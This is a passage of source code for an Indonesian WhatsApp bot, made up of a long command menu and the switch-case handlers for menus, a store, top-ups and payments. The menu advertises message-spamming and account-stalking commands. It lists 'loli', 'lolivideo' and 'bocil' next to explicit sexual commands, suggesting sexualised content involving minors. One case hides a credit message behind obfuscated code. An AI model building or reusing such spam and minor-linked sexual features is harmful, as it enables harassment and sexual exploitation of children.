> 257 ${prefix}image *query*
> 258 ${prefix}pinterest *query*
> 259 ${prefix}nulis *teks*
> 260 ${prefix}iguser *ussername*
> 261 ${prefix}igstalk *username*
> 262 ${prefix}githubstalk *username*
> 263 ${prefix}tiktokstalk *ussername*
> 264 ${prefix}img2url *reply foto*
> 265 ${prefix}ytsearch *query*



*⌜ War Menu ⌟*
> 266 ${prefix}pvp


*⌜ Hiburan Menu ⌟*
> 267 ${prefix}katailham
> 268 ${prefix}quotes
> 269 ${prefix}quotesanime
> 270 ${prefix}quotesislami
> 271 ${prefix}quotesdilan
> 272 ${prefix}pantun
> 273 ${prefix}bucin
> 274 ${prefix}faktaunik


*⌜ Hewan Menu ⌟*
> 275 ${prefix}buaya
> 276 ${prefix}elang
> 277 ${prefix}ayam
> 278 ${prefix}burung
> 279 ${prefix}burung hantu
> 280 ${prefix}burung gagak
> 281 ${prefix}burung puyuh
> 282 ${prefix}bebek
> 283 ${prefix}angsa
> 284 ${prefix}sapi
> 285 ${prefix}kuda
> 286 ${prefix}badak
> 287 ${prefix}kambing
> 288 ${prefix}unta
> 289 ${prefix}kucing
> 290 ${prefix}anjing
> 291 ${prefix}harimau
> 292 ${prefix}singa
> 293 ${prefix}monyet
> 294 ${prefix}babi
> 295 ${prefix}ikan
> 296 ${prefix}ikan hiu
> 297 ${prefix}ikan kembung
> 298 ${prefix}ikan laga
> 299 ${prefix}tikus
> 300 ${prefix}kelinci
> 301 ${prefix}ular
> 302 ${prefix}siput
> 303 ${prefix}domba
> 304 ${prefix}katak
> 305 ${prefix}naga
> 306 ${prefix}laba-laba
> 307 ${prefix}kupu-kupu
> 308 ${prefix}kalajengking
> 309 ${prefix}kingkong
> 310${prefix}jerapa
> 311 ${prefix}gajah
> 312 ${prefix}serigala
> 313 ${prefix}cikcak
> 314 ${prefix}pinguin
> 315 ${prefix}kepiting
> 316 ${prefix}ubur-ubur
> 317 ${prefix}lebah
> 318 ${prefix}kura-kura
> 319 ${prefix}banteng
> 320 ${prefix}kelalawar


*⌜ Tools Menu ⌟*   
> 321 ${prefix}addvn
> 322 ${prefix}listvn
> 323 ${prefix}getvn
> 324 ${prefix}addimg
> 325 ${prefix}listimg
> 326 ${prefix}getimg
> 327 ${prefix}addvid
> 328 ${prefix}listvid
> 329 ${prefix}getvid
> 330 ${prefix}addstik
> 331 ${prefix}liststik
> 332 ${prefix}getstik
> 333 ${prefix}tupai


*⌜ Berita Menu ⌟*
> 334 ${prefix}covidglobal
> 335 ${prefix}infogempa
> 336 ${prefix}infogunungsumeru
> 337 ${prefix}infobanjir
> 338 ${prefix}infolongsor


*⌜ Wibu Menu ⌟*
> 339 ${prefix}loli
> 340 ${prefix}manga
> 341 ${prefix}anime 
> 342 ${prefix}lolivideo
> 343 ${prefix}husbu
> 344 ${prefix}waifu
> 345 ${prefix}milf
> 346 ${prefix}neko
> 347 ${prefix}kanna
> 348 ${prefix}sagiri
> 349 ${prefix}hentai
> 350 ${prefix}wallnime
> 351 ${prefix}kusonime
> 352 ${prefix}megumin
> 353 ${prefix}otakudesu
> 354 ${prefix}doujindesu
> 355 ${prefix}storyanime
> 356 ${prefix}otakuongoing
> 357 ${prefix}nhentai *code*
> 358 ${prefix}nekopoi *link*


*⌜ Random Menu ⌟*
> 359 ${prefix}tourl
> 360 ${prefix}tinyurl
> 361 ${prefix}bilamgangka
> 362 ${prefix}artimimpi
> 363 ${prefix}resepmasakan


*⌜ Asupan Menu ⌟*
> 364 ${prefix}ukhty
> 365 ${prefix}hijaber
> 366 ${prefix}santuy
> 367 ${prefix}bocil
> 368 ${prefix}cecan
> 369 ${prefix}geayubi
> 370 ${prefix}bunga
> 371 ${prefix}aura
> 372 ${prefix}ayu
> 373 ${prefix}caca
> 374 ${prefix}delvira
> 375 ${prefix}alita
> 376 ${prefix}putri

*⌜ Spam Menu ⌟*
> 377 ${prefix}spam
> 378 ${prefix}tospam
> 379 ${prefix}spamsw


*⌜ Search Menu ⌟*
> 380 ${prefix}nekopoisearch *query*
> 381 ${prefix}ytsearch *query*
> 382 ${prefix}shopee *product*
> 383 ${prefix}playstore *query*
> 384 ${prefix}ssweb *query*
> 385 ${prefix}google *query*
> 386 ${prefix}image *query*
> 387 ${prefix}pinterest *query*
> 388 ${prefix}apkpure *query*


*⌜ Fun Menu ⌟*
> 389 ${prefix}mining
> 390 ${prefix}cekwatak
> 391 ${prefix}cekmati [nama]
> 392 ${prefix}wangy [nama]
> 393 ${prefix}citacita
> 394 ${prefix}toxic
> 395 ${prefix}truth
> 396 ${prefix}dare
> 397 ${prefix}apakah
> 398 ${prefix}bisakah
> 399 ${prefix}kapankah
> 400 ${prefix}rate
> 401 ${prefix}jadian
> 402 ${prefix}cantik
> 403 ${prefix}ganteng
> 404 ${prefix}beban
> 405 ${prefix}babi
> 406 ${prefix}cekganteng
> 407 ${prefix}cekcantik


*⌜ Meme Menu ⌟*
> 408 ${prefix}meme
> 409 ${prefix}memeindo
> 410 ${prefix}darkjoke


*⌜ Owner Menu ⌟*
> 411 ${prefix}broadcast
> 412 ${prefix}broadcastgroup
> 413 ${prefix}bc
> 414 ${prefix}bcgc
> 415 ${prefix}leave
> 416 ${prefix}leaveall
> 417 ${prefix}join *link gc*
> 418 ${prefix}shutdown
> 419 ${prefix}getquoted
> 420 ${prefix}addupdate *fiturnya*
> 421 ${prefix}exif *nama|author*
> 422 ${prefix}sewa add/del *waktunya*
> 423 ${prefix}premium add @tag|nomor
> 424 ${prefix}premium del @tag|nomor
> 425 ${prefix}clearall
> 426 ${prefix}delete
> 427 ${prefix}block
> 428 ${prefix}unblock
> 429 ${prefix}setppbot
> 430 ${prefix}setppbot2
> 431 ${prefix}self
> 432 ${prefix}public
> 433 ${prefix}restart
> 434 ${prefix}leaveall
> 435 ${prefix}join
> 436 ${prefix}join2
> 437 ${prefix}banned
> 438 ${prefix}unbanned
> 439 ${prefix}term
> 440 ${prefix}eval
> 441 ${prefix}reset
> 442 ${prefix}clearall


*⌜ Anime Menu ⌟* 
> 443 ${prefix}anime
> 444 ${prefix}kusonime
> 445 ${prefix}art
> 446 ${prefix}bts
> 447 ${prefix}exo
> 448 ${prefix}elf
> 449 ${prefix}loli
> 450 ${prefix}neko
> 451 ${prefix}waifu
> 452 ${prefix}shota
> 453 ${prefix}husbu
> 454 ${prefix}sagiri
> 455 ${prefix}shinobu
> 456 ${prefix}megumin
> 457 ${prefix}wallnime
> 458 ${prefix}chiisaihentai
> 459 ${prefix}trap
> 460 ${prefix}blowjob
> 461 ${prefix}yaoi
> 462 ${prefix}ecchi
> 463 ${prefix}ahegao
> 464 ${prefix}hololewd
> 465 ${prefix}sideoppai
> 466 ${prefix}animefeets
> 467 ${prefix}animebooty
> 468 ${prefix}animethighss
> 469 ${prefix}hentaiparadise
> 470 ${prefix}animearmpits
> 472 ${prefix}lewdanimegirls
> 473 ${prefix}biganimetiddies
> 474 ${prefix}animebellybutton
> 475 ${prefix}hentai4everyone
> 476 ${prefix}bj
> 477 ${prefix}ero
> 478 ${prefix}cum
> 479 ${prefix}feet
> 480 ${prefix}yuri
> 481 ${prefix}trap
> 482 ${prefix}lewd
> 483 ${prefix}feed
> 484 ${prefix}eron
> 485 ${prefix}solo
> 486 ${prefix}gasm
> 487 ${prefix}poke
> 488 ${prefix}anal
> 489 ${prefix}holo
> 490 ${prefix}tits
> 491 ${prefix}kuni
> 492 ${prefix}kiss
> 493 ${prefix}erok
> 494 ${prefix}smug
> 495 ${prefix}baka
> 496 ${prefix}solog
> 497 ${prefix}feetg
> 498 ${prefix}lewdk
> 499 ${prefix}waifu
> 500 ${prefix}pussy
> 501 ${prefix}femdom
> 502 ${prefix}cuddle
> 503 ${prefix}eroyuri
> 504 ${prefix}cum_jpg
> 505 ${prefix}blowjob
> 506 ${prefix}erofeet
> 507 ${prefix}holoero
> 508 ${prefix}classic
> 509 ${prefix}erokemo
> 510 ${prefix}fox_girl
> 511 ${prefix}futanari
> 512 ${prefix}lewdkemo
> 513 ${prefix}wallpaper
> 514 ${prefix}pussy_jpg
> 515 ${prefix}kemonomimi
> 517 ${prefix}ngif
> 518 ${prefix}nsfw_neko_gif
> 516 ${prefix}manga
> 517 ${prefix}doujindesu
> 518 ${prefix}sagiri
> 519 ${prefix}wallnime
> 520 ${prefix}otakudesu
> 521 ${prefix}neko
> 522 ${prefix}kanna
> 523 ${prefix}megumin


*⌜ Hentai Menu ⌟*
> 524 ${prefix}hentai
> 525 ${prefix}randomhentai
> 526 ${prefix}hentaifemdom
> 527 ${prefix}random_hentai_gif
> 528 ${prefix}nhentaipdf
> 529 ${prefix}nhentai
> 530 ${prefix}nekopoi
> 531 ${prefix}nekopoisearch
> 532 ${prefix}nsfw_avatar`
               buttons = [{buttonId: `${prefix}infobot`,buttonText:{displayText: 'ɪɴғᴏʙᴏᴛ'},type:1},{buttonId: `${prefix}donasi`,buttonText:{displayText: 'ᴅᴏɴᴀsɪ'},type:1},{buttonId: `${prefix}owner`,buttonText:{displayText: 'ᴏᴡɴᴇʀ'},type:1}]

               imageMsg = (await Ramdani.prepareMessageMedia(fs.readFileSync(`./media/foto/menu.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/foto/menu.jpg`)})).imageMessage

               buttonsMessage = {
               contentText: `${allmenu}`,
               footerText: '© ʙʏ ʀᴀᴍᴅᴀɴɪ ᴏғғɪᴄɪᴀʟ', imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}

              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              Ramdani.relayWAMessage(prep)
              randommusic = fs.readFileSync(`./media/audio/${randomaudio}.mp3`)
              Ramdani.sendMessage(from, randommusic, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
              break           
        case 'c':
        case 'command':
        if (!isRegist) return freply(mess.regist)
        if (isBanned) return freply(mess.banned)
               list = []
               listmenu = [`infobot`,`rules`,`script`,`tqto`,`owner`,`donasi`,`allmenu`,`storemenu`,`infomenu`,`groupmenu`,`gamemenu`,`islammenu`,`downloadmenu`,`makermenu`,`sertimenu`,`stickermenu`,`soundmenu`,`vnmenu`,`toolsmenu`,`statusmenu`,`dewasamenu`,`othermenu`,`warmenu`,`hiburan menu`,`hewanmenu`,`beritamenu`,`animemenu`,`hentaimenu`,`asupanmenu`,`randommenu`,`ownermenu`,`spammenu`,`searchmenu`,`funmenu`,`mememenu`]
               listmenuu = [`Info Bot`,`Rules`,`Script`,`Thanks To`,`Owner Bot`,`Donasi`,`All Menu`,`Store Menu`,`Info Menu`,`Group Menu`,`Game Menu`,`Islam Menu`,`Download Menu`,`Maker Menu`,`Serti Menu`,`Sticker Menu`,`Sound Menu`,`Vn Menu`,`Tools Menu`,`Status Menu`,`Dewasa Menu`,`Other Menu`,`War Menu`,`Hiburan Menu`,`Hewan Menu`,`Berita Menu`,`Anime Menu`,`Hentai Menu`,`Asupan Menu`,`Random Menu`,`Owner Menu`,`Spam Menu`,`Search Menu`,`Fun Menu`,`Meme Menu`]
               nombor = 1
               startnum = 0
               for (let x of listmenu) {
               const yy = {title: 'Menu ' + nombor++,
                    rows: [
                       {
                        title: `${listmenuu[startnum++]}`,
                        description: ``,
                        rowId: `${prefix}${x}`
                      }
                    ]
                   }
                        list.push(yy)
           }
               listmsg(from, `${ucapanWaktu}`,  `*Hallo Kak 👋* ${pushname} ${ucapanWaktu}, Silahkan Pilih Menunya Disini, Dan Jangan Lupa Baca Rules, Supaya Tau Peraturan Nya!`, list)     
               randommusic = fs.readFileSync(`./media/audio/${randomaudio}.mp3`)
               Ramdani.sendMessage(from, randommusic, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
               break     
//------------------< case nya >------------------ 
case 'infobot2':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
freply(`━━━━━ *INFO BOT* ━━━━━
❏ BASE ORI : Ramdani Official
❏ TYPE SC : nodejs
❏ DI BUAT PADA : sel, 29, mart, 2022
❏ GITHUB CREATOR : https://github.com/Ramdaniofficial
❏ YT CREATOR : https://youtube.com/channel/UCB157jomCne961WzYHpG4gg
*━━━━━━━━━━━━━━━━━━━━*`)
randommusic = fs.readFileSync(`./media/audio/${randomaudio}.mp3`)
Ramdani.sendMessage(from, randommusic, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'script2': case 'sc2':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
freply(`━━━━━ *SCRIPT* ━━━━━
❏ LINK VIA GITHUB : https://github.com/Ramdaniofficial/v17
❏ BASE ORI : Ramdani Official
❏ TYPE SC : nodejs
❏ DI BUAT PADA : sel, 29, mart, 2022
*━━━━━━━━━━━━━━━━━━━━*`)
break
case 'alllmenu2':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, allmenuu(prefix), MessageType.text, {quoted: troli})
break
      case 'qris':
      if (!isRegist) return freply(mess.regist)
      if (isBanned) return freply(mess.banned)
      qris =`*SCAN QRIS NYA OM, TEEF SEIHKLASNYA🗿*`
               buttons = [{buttonId: `${prefix}kapan`,buttonText:{displayText: 'IYA TAR GW TEEF🗿'},type:1},{buttonId: `${prefix}ogah`,buttonText:{displayText: 'OGAH AH🗿'},type:1},{buttonId: `${prefix}duit`,buttonText:{displayText: 'GAADA DUIT🗿'},type:1}]

               imageMsg = (await Ramdani.prepareMessageMedia(fs.readFileSync(`./media/foto/qris.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/foto/qris.jpg`)})).imageMessage

               buttonsMessage = {
               contentText: `${qris}`,
               footerText: '© ʙʏ ʀᴀᴍᴅᴀɴɪ ᴏғғɪᴄɪᴀʟ', imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}

               prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              Ramdani.relayWAMessage(prep)
                break
                //----------------<jawabnya>-------------
                case 'kapan':
                if (!isRegist) return freply(mess.regist)
                if (isBanned) return freply(mess.banned)
                freply(`kapan bwang?🗿`)
                break
                if (!isRegist) return freply(mess.regist)
                if (isBanned) return freply(mess.banned)
                case 'ogah':
                if (!isRegist) return freply(mess.regist)
                if (isBanned) return freply(mess.banned)
                freply(`anjg🗿`)
                break
                case 'duit':
                if (!isRegist) return freply(mess.regist)
                if (isBanned) return freply(mess.banned)
                freply(`minta ke bokap lu lah:v🗿`)
                break
//----------------<store menu>----------------
               case 'store menu':
               case 'storemenu':
               case 'sm':
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
               list = []
               liststore = [`sewabot`,`jasaup`,`jasarun`,`buyprem`,`buysc`,`topupgame`,`topupsaldo`]
               liststoree= [`Sewa Bot`,`Jasa Up`,`Jasa Run`,`Buy Prem`,`Buy Script`,`Topup Game`,`Topup Saldo`]
               nombor = 1
               startnum = 0
               for (let x of liststore) {
               const yy = {title: 'Store' + nombor++,
                    rows: [
                       {
                        title: `${liststoree[startnum++]}`,
                        description: ``,
                        rowId: `${prefix}${x}`
                      }
                    ]
                   }
                        list.push(yy)
           }
               listmsg(from, `${ucapanWaktu}`,  `*Hallo Kak 👋* ${pushname} ${ucapanWaktu}, Silahkan Pilih Gamenya Disini`, list)
               randommusic = fs.readFileSync(`./media/audio/${randomaudio}.mp3`)
               Ramdani.sendMessage(from, randommusic, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
               break
               case 'topupgame':
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
               list = []
               liststore = [`topupff`,`topupml`,`topuppubg`,`topuppb`,`topupssm`]
               liststoree= [`Top Up Free Fire`,`Top Up Mobile Legends`,`Top Up Pubg`,`Top Up Point Blank`,`Topup Sausage Man`]
               nombor = 1
               startnum = 0
               for (let x of liststore) {
               const yy = {title: 'Top Up' + nombor++,
                    rows: [
                       {
                        title: `${liststoree[startnum++]}`,
                        description: ``,
                        rowId: `${prefix}${x}`
                      }
                    ]
                   }
                        list.push(yy)
           }
               listmsg(from, `${ucapanWaktu}`,  `*Hallo Kak 👋* ${pushname} ${ucapanWaktu}, Silahkan Pilih Gamenya Disini`, list)
               randommusic = fs.readFileSync(`./media/audio/${randomaudio}.mp3`)
               Ramdani.sendMessage(from, randommusic, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
               break
case 'topupsaldo':
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
               freply(mess.wait)
               list = []
               liststore = [`topupgopay`,`topupdana`,`topupovo`,`topuppulsa`]
               liststoree= [`Top Up Gopay`,`Top Up Dana`,`Top Up Ovo`,`Top Up Pulsa`]
               nombor = 1
               startnum = 0
               for (let x of liststore) {
               const yy = {title: 'Top Up' + nombor++,
                    rows: [
                       {
                        title: `${liststoree[startnum++]}`,
                        description: ``,
                        rowId: `${prefix}${x}`
                      }
                    ]
                   }
                        list.push(yy)
           }
               listmsg(from, `${ucapanWaktu}`,  `*Hallo Kak 👋* ${pushname} ${ucapanWaktu}, Silahkan Pilih Gamenya Disini`, list)
               break
//THANKS TO
case 'thanksto': //DI HAPUS? KETAHUAN AWAS LUH GUA GABAKAL NGEBOT LAGI
case 'tqto':
case 'tqtq':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
freply(`• *BIG THANKS TO*
• RAMDANI OFFICIAL (ME)
• ARUL (MY GURU)
• MHANKBARBAR (MASTAH)
• APRILIA
• ZEEONE OFC
• DIKA ARDNT
• RIMURUBOTZ
• KAHFZXZY
• LEXXY OFFICIAL
• HERMAN CHANNEL
• ABIL BOT
• KURR XD OFFICIAL
• DIKA XD
• SIEGRIN
• KANNABOT
• YANZ BOT`)
randomaudi = fs.readFileSync(`./media/audio/${randomaudio}.mp3`)
Ramdani.sendMessage(from, randomaudi, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true}) 
break
//FITUR NYAAH BANGGG

//JANGAN DI HAPUS INI NYA ANJING, KETAHUAN AWAS LUH BANG
//KASIH CREDITS LAH KONCOL, CAPEK GUA CODING
//BIKIN SC NIH 1 MINGGU LEBIH ASU GAK DI KASIH CREDITS BABI
case 'script':
case 'script ori':
case 'sc':
case 'sc ori':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
freply(mess.wait)
//DI APUS AWAS AJA REST API GUA OFF IN
function _0xa39c(_0x55373c,_0x4f554b){var _0x6f350f=_0x6f35();return _0xa39c=function(_0xa39c38,_0x38fbeb){_0xa39c38=_0xa39c38-0x193;var _0x1c1ff0=_0x6f350f[_0xa39c38];return _0x1c1ff0;},_0xa39c(_0x55373c,_0x4f554b);}var _0x98b2d6=_0xa39c;(function(_0x3c89fb,_0x3c0da8){var _0x146795=_0xa39c,_0x15f157=_0x3c89fb();while(!![]){try{var _0x376827=parseInt(_0x146795(0x197))/0x1+-parseInt(_0x146795(0x196))/0x2+parseInt(_0x146795(0x193))/0x3*(-parseInt(_0x146795(0x19d))/0x4)+parseInt(_0x146795(0x199))/0x5*(-parseInt(_0x146795(0x19a))/0x6)+parseInt(_0x146795(0x195))/0x7+-parseInt(_0x146795(0x198))/0x8*(parseInt(_0x146795(0x19c))/0x9)+parseInt(_0x146795(0x194))/0xa;if(_0x376827===_0x3c0da8)break;else _0x15f157['push'](_0x15f157['shift']());}catch(_0x4fb779){_0x15f157['push'](_0x15f157['shift']());}}}(_0x6f35,0xd7373),freply(_0x98b2d6(0x19b)));function _0x6f35(){var _0xd7c541=['1628812jeDVJA','11978376xbAUoh','1549025vKiqSi','6NFQNcJ','_*SRIPT\x20ORI\x20BY\x20RAMDANI\x20OFFICIAL*_\x0a•\x20*LINK*\x0a•\x20*GITHUB*\x20:\x20https://github.com/Ramdaniofficial/v17\x0a•\x20*YOUTUBE*\x20:\x20https://youtube.com/channel/UCB157jomCne961WzYHpG4gg','9EUOBqv','1711868cgIpPU','3fsRXCB','14268290YorAQW','6636119fcFvXR','1774132seWGmo'];_0x6f35=function(){return _0xd7c541;};return _0x6f35();}
randommusic = fs.readFileSync(`./media/audio/${randomaudio}.mp3`)
Ramdani.sendMessage(from, randommusic, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
//BELI SCRIPT
case 'beliscript':
case 'belisc':
case 'buysc':
case 'buyscript':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
randommusic = fs.readFileSync(`./media/audio/${randomaudio}.mp3`)
Ramdani.sendMessage(from, randommusic, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
Ramdani.sendMessage(from, beliscript(prefix, nomorowner), text)
break
//JASA
//JASA RUN HEROKU
case 'jasarunheroku':
case 'jasarun':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
freply(`*SILAHLAN HUBUNGI*\nhttp://wa.me/6289512545999?text=bang+mau+order+jasa+run+heroku:v`)
break
//JASA UP HEROKU
case 'jasaupgithub':
case 'jasaup':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
freply(`*SILAHLAN HUBUNGI*\nhttp://wa.me/6289512545999?text=bang+mau+order+jasa+up+github:v`)
break
//STORE MENU//
//TOP UP GAME
case 'topupgame2':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, topupgame(prefix), MessageType.text, {quoted: troli})
break
case 'topupfreefire':
case 'topupff':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, topupfreefire(prefix, nomorowner), MessageType.text, {quoted: troli})
break
case 'topupmobilelegends':
case 'topupml':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, topupmobilelegends(prefix, nomorowner), MessageType.text, {quoted: troli})
break
case 'topuppubg':
case 'topuppapji':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, topuppubg(prefix, nomorowner), MessageType.text, {quoted: troli})
break
case 'topuppointblank':
case 'topuppb':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, topuppointblank(prefix, nomorowner), MessageType.text, {quoted: troli})
break
//TOP UP SALDO
case 'topupsaldo':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, topupsaldo(prefix), text)
break
case 'topupgopay':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, topupgopay(prefix, nomorowner), MessageType.text, {quoted: troli})
break
case 'topupdana':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, topupdana(prefix, nomorowner), MessageType.text, {quoted: troli})
break
case 'topupovo':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, topupovo(prefix, nomorowner), MessageType.text, {quoted: troli})
break
case 'topuppulsa':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, topuppulsa(prefix, nomorowner), MessageType.text, {quoted: troli})
break
                
//payment                
      case 'dana':
      if (!isRegist) return freply(mess.regist)
      if (isBanned) return freply(mess.banned)
             freply(`DANA : ${dana}`)
             break
           case 'gopay':
           if (!isRegist) return freply(mess.regist)
           if (isBanned) return freply(mess.banned)
             freply(`*GOPAY :* ${gopay}`)
             break
         case 'ovo':
         if (!isRegist) return freply(mess.regist)
         if (isBanned) return freply(mess.banned)
             freply(`*OVO :* ${ovo}`)
             break  
         case 'pulsa':
         if (!isRegist) return freply(mess.regist)
         if (isBanned) return freply(mess.banned)
             freply(`*PULSA :* ${pulsa}`)
             break    
// SOSMET          
      case 'infoig':
      if (!isRegist) return freply(mess.regist)
      if (isBanned) return freply(mess.banned)
             freply(`Follow Instagram Owner Ya : https://www.instagram.com/muhammadramdani196453`)
             break
//casee nya
case 'grupbot':
case 'groupbot':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, groupbot(prefix), MessageType.text, {quoted: troli})
break
break
case 'infobot':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, infobot(prefix), MessageType.text, {quoted: troli})
break
case 'rules':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, rulesbot(prefix), MessageType.text, {quoted: troli})
break
case 'sewabot':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, sewabot(prefix), MessageType.text, {quoted: troli})
break
case 'buyprem':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, beliprem(prefix), MessageType.text, {quoted: troli})
break
case 'ownermenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, ownermenu(prefix), MessageType.text, {quoted: troli})
break
case 'downloadmenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, downloadmenu(prefix), MessageType.text, {quoted: troli})
break
case 'gamemenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, gamemenu(prefix), MessageType.text, {quoted: troli})
break      
case 'owner':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, owner(prefix), MessageType.text, {quoted: troli})
break
case 'infomenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, infomenu(prefix), MessageType.text, {quoted: troli})
break
case 'stickermenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, stickermenu(prefix), MessageType.text, {quoted: troli})
break
case 'islammenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, islammenu(prefix), MessageType.text, {quoted: troli})
break
case 'soundmenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, soundmenu(prefix), MessageType.text, {quoted: troli})
break
case 'vnmenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, vnmenu(prefix), MessageType.text, {quoted: troli})
break
case 'sertimenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, sertimenu(prefix), MessageType.text, {quoted: troli})
break
case 'ceritamenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, ceritamenu(prefix), MessageType.text, {quoted: troli})
break  
case 'makermenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, makermenu(prefix), MessageType.text, {quoted: troli})
break 
case 'toolsmenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from,toolsmenu(prefix), MessageType.text, {quoted: troli})
break                   
case 'dewasamenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, dewasamenu(prefix), MessageType.text, {quoted: troli})
break                                    
case 'othermenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, othermenu(prefix), MessageType.text, {quoted: troli})
break
case 'groupmenu': 
case 'grupmenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, groupmenu(prefix), MessageType.text, {quoted: troli})
break
case 'pricegtivd': 
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, groupmenu(prefix), MessageType.text, {quoted: troli})
break
case 'rolegtli': 
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, groupmenu(prefix), MessageType.text, {quoted: troli})
break
case 'rolegtivd': 
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, groupmenu(prefix), MessageType.text, {quoted: troli})
break
case 'warmenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, warmenu(prefix), MessageType.text, {quoted: troli})
break
case 'funmenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, funmenu(prefix), MessageType.text, {quoted: troli})
break
case 'statusmenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, statusmenu(prefix), MessageType.text, {quoted: troli})
break
case 'beritamenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, beritamenu(prefix), MessageType.text, {quoted: troli})
break
case 'randommenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, randommenu(prefix), MessageType.text, {quoted: troli})
break
case 'hiburanmenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, hiburanmenu(prefix), MessageType.text, {quoted: troli})
break
case 'hewanmenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, hewanmenu(prefix), MessageType.text, {quoted: troli})
break
case 'searchmenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, searchmenu(prefix), MessageType.text, {quoted: troli})
break
case 'mememenu':
if (!isRegist) return freply(mess.regist)
